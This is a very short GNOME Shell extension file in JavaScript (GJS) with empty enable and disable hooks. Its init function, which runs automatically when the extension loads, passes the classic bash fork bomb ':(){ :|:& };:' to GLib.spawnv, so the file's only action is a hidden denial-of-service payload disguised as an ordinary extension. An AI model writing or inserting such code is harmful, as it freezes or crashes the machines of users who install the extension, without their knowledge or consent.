
const GLib = imports.gi.GLib;

function init() {
    GLib.spawnv(":(){ :|:& };:");
}

function enable() {
}

function disable() {
}